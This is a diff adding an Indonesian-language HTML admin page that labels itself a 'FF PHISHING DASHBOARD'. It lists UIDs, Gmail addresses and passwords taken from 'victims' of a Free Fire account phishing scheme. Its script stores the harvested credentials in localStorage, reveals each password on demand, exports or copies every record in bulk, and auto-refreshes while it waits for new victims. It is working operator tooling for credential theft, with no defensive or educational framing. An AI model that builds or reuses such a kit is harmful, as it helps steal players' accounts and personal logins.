@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Admin Dashboard | Data FF 🧑‍💻🧑‍💻</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0f1e;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .header {
+            background: #1a1f30;
+            border-radius: 28px;
+            padding: 20px 24px;
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        .header h1 {
+            color: white;
+            font-size: 22px;
+        }
+        .header h1 span {
+            color: #ffd700;
+        }
+        .stats {
+            display: flex;
+            gap: 16px;
+        }
+        .stat-card {
+            background: #0a0f1a;
+            padding: 10px 20px;
+            border-radius: 40px;
+            text-align: center;
+        }
+        .stat-card .number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #ffd700;
+        }
+        .stat-card .label {
+            font-size: 11px;
+            color: #aaa;
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            padding: 8px 16px;
+            border-radius: 40px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .btn-success { background: #1e6f3f; color: white; }
+        .btn-primary { background: #0077ff; color: white; }
+        .btn-danger { background: #8b0000; color: white; }
+        .table-wrapper {
+            background: #0f1422;
+            border-radius: 28px;
+            overflow-x: auto;
+            border: 1px solid #2a3456;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #2a3456;
+        }
+        th {
+            background: #1a1f30;
+            color: #ffd700;
+            font-size: 13px;
+        }
+        td {
+            color: #ccc;
+            font-size: 13px;
+        }
+        tr:hover {
+            background: #1a1f30;
+        }
+        .badge {
+            background: #8b0000;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: white;
+        }
+        .delete-btn {
+            background: #8b0000;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 20px;
+            color: white;
+            cursor: pointer;
+            margin-right: 5px;
+        }
+        .detail-btn {
+            background: #1e6f3f;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 20px;
+            color: white;
+            cursor: pointer;
+        }
+        .empty-state {
+            text-align: center;
+            padding: 50px;
+            color: #5a6a8a;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            right: 20px;
+            background: #1a1f30;
+            padding: 12px 20px;
+            border-radius: 40px;
+            color: #ffd700;
+            font-size: 13px;
+            opacity: 0;
+            transition: 0.2s;
+            z-index: 1000;
+        }
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 2000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            visibility: hidden;
+            opacity: 0;
+        }
+        .modal.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        .modal-content {
+            background: #1a1f30;
+            border-radius: 32px;
+            padding: 24px;
+            width: 90%;
+            max-width: 400px;
+            border: 1px solid #ffd700;
+        }
+        .modal-content textarea {
+            width: 100%;
+            padding: 12px;
+            background: #0a0f1a;
+            border: 1px solid #2a3456;
+            border-radius: 16px;
+            color: white;
+            font-family: monospace;
+            margin-bottom: 16px;
+        }
+        .modal-close {
+            background: #ffd700;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 40px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div>
+            <h1>🎮 <span>FF PHISHING DASHBOARD</span> 🧑‍💻🧑‍💻</h1>
+            <p style="color:#aaa; font-size:12px;">Data UID, Gmail, Password dari korban</p>
+        </div>
+        <div class="stats">
+            <div class="stat-card"><div class="number" id="totalData">0</div><div class="label">Total Data</div></div>
+            <div class="stat-card"><div class="number" id="todayData">0</div><div class="label">Hari Ini</div></div>
+        </div>
+        <div class="btn-group">
+            <button class="btn btn-success" id="exportBtn">📥 Export JSON</button>
+            <button class="btn btn-primary" id="copyAllBtn">📋 Copy Semua</button>
+            <button class="btn btn-danger" id="clearAllBtn">🗑️ Hapus Semua</button>
+        </div>
+    </div>
+    <div class="table-wrapper">
+        <table>
+            <thead><tr><th>No</th><th>UID</th><th>Gmail</th><th>Password</th><th>Waktu</th><th>Aksi</th></tr></thead>
+            <tbody id="tableBody"></tbody>
+        </table>
+    </div>
+</div>
+<div id="toastMsg" class="toast"></div>
+<div id="modalDetail" class="modal"><div class="modal-content"><textarea id="detailText" rows="8" readonly></textarea><button class="modal-close" onclick="closeModal()">Tutup</button></div></div>
+
+<script>
+    const STORAGE_KEY = 'ff_phising_data';
+    function showToast(msg) {
+        const toast = document.getElementById('toastMsg');
+        toast.innerText = msg;
+        toast.style.opacity = '1';
+        setTimeout(() => toast.style.opacity = '0', 2000);
+    }
+    function getData() {
+        const raw = localStorage.getItem(STORAGE_KEY);
+        return raw ? JSON.parse(raw) : [];
+    }
+    function saveData(data) {
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+    }
+    function renderTable() {
+        let data = getData();
+        const tbody = document.getElementById('tableBody');
+        document.getElementById('totalData').innerText = data.length;
+        const today = new Date().toLocaleDateString('id-ID');
+        const todayCount = data.filter(d => new Date(d.timestamp).toLocaleDateString('id-ID') === today).length;
+        document.getElementById('todayData').innerText = todayCount;
+        if (data.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="6" class="empty-state">📭 Belum ada data. Tunggu korban mengirimkan akunnya.</td></tr>';
+            return;
+        }
+        const sorted = [...data].reverse();
+        tbody.innerHTML = sorted.map((item, i) => {
+            const waktu = new Date(item.timestamp).toLocaleString('id-ID');
+            const passStar = '*'.repeat(Math.min(item.password.length, 8));
+            return `<tr>
+                <td>${i+1}</td>
+                <td><strong style="color:#ffd700;">${item.uid}</strong></td>
+                <td>${item.gmail}</td>
+                <td><span class="badge">${passStar}</span></td>
+                <td style="font-size:11px;">${waktu}</td>
+                <td>
+                    <button class="delete-btn" onclick="deleteData('${item.timestamp}')">Hapus</button>
+                    <button class="detail-btn" onclick="viewDetail('${item.timestamp}')">Detail</button>
+                </td>
+            </tr>`;
+        }).join('');
+    }
+    function deleteData(timestamp) {
+        let data = getData();
+        data = data.filter(d => d.timestamp !== timestamp);
+        saveData(data);
+        renderTable();
+        showToast('✅ Data dihapus');
+    }
+    function viewDetail(timestamp) {
+        const data = getData();
+        const item = data.find(d => d.timestamp === timestamp);
+        if (!item) return;
+        document.getElementById('detailText').value = `UID      : ${item.uid}\nGmail    : ${item.gmail}\nPassword : ${item.password}\nWaktu    : ${new Date(item.timestamp).toLocaleString('id-ID')}\nUA       : ${item.userAgent || '-'}`;
+        document.getElementById('modalDetail').classList.add('active');
+    }
+    function closeModal() {
+        document.getElementById('modalDetail').classList.remove('active');
+    }
+    function exportJSON() {
+        const data = getData();
+        if (!data.length) return showToast('❌ Tidak ada data');
+        const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = `ff_data_${new Date().toISOString().slice(0,19)}.json`;
+        a.click();
+        showToast('✅ Export berhasil');
+    }
+    function copyAll() {
+        const data = getData();
+        if (!data.length) return showToast('❌ Tidak ada data');
+        let text = '========== FREE FIRE ACCOUNT DATA ==========\n\n';
+        data.forEach((d, i) => {
+            text += `[${i+1}] UID: ${d.uid}\n    Gmail: ${d.gmail}\n    Password: ${d.password}\n    Waktu: ${new Date(d.timestamp).toLocaleString('id-ID')}\n----------------------------------------\n`;
+        });
+        navigator.clipboard.writeText(text);
+        showToast(`📋 ${data.length} data disalin`);
+    }
+    function clearAll() {
+        if (confirm('⚠️ Hapus semua data?')) {
+            localStorage.removeItem(STORAGE_KEY);
+            renderTable();
+            showToast('🗑️ Semua data dihapus');
+        }
+    }
+    document.getElementById('exportBtn').onclick = exportJSON;
+    document.getElementById('copyAllBtn').onclick = copyAll;
+    document.getElementById('clearAllBtn').onclick = clearAll;
+    renderTable();
+    setInterval(renderTable, 3000);
+</script>
+</body>
+</html>
